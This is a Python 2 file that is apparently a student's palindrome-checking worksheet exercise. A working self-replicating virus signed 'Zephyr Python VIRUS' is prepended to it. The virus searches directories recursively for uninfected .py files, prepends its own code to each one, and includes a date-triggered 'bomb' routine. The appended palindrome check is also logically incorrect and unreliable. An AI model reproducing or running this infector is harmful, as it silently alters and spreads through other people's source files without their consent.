#!/usr/bin/python

import os
import datetime
SIGNATURE = "Zephyr Python VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print "HAPPY BIRTHDAY CRANKLIN!"
#-------------------------------------------------------------------------------
# Name:        Python Worksheet 1
# Purpose:     Question 13
# Author:      Mrinal Wahal
# Created:     21/07/2014
# Copyright:   (c) student 2014
#-------------------------------------------------------------------------------

# A 3-Digit Palindrome

n = input("enter the no.")
if n/100==n%(n/10):
    print "yes"
else:
    print "no"